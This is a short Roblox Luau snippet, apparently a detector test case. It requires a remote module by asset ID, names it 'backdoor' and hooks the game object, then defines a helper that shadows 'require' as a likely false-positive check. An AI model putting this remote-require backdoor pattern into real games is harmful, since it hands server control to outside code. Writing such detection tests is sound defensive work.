local ServerStorage = game:GetService("ServerStorage")

local backdoor = require(17453289042)
backdoor.hook(game)

-- 40 lines later, in an unrelated helper, a harmless-looking local:
local function describe(t)
	local require = t.require
	return tostring(require)
end

return describe
